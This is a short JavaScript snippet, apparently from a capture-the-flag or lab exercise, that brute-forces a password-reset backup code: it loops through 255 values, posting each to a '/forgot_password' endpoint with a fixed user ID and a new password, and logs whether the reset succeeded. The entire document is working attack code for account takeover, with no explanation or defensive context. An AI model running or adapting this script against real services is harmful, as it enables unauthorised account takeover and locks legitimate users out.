for(var i = 0; i < 0xff; i++) {
    var data = new FormData();
    data.append('userid', 'Apple');
    data.append('newpassword', 'a');
    data.append('backupCode', i);

    var xhr = new XMLHttpRequest();
    xhr.open('POST', '/forgot_password', true);
    xhr.onload = function () {
        if((this.responseText).includes('Success')) {
            console.log("successed");
        } else {
            console.log("ailed");
        }
    };
    xhr.send(data);
};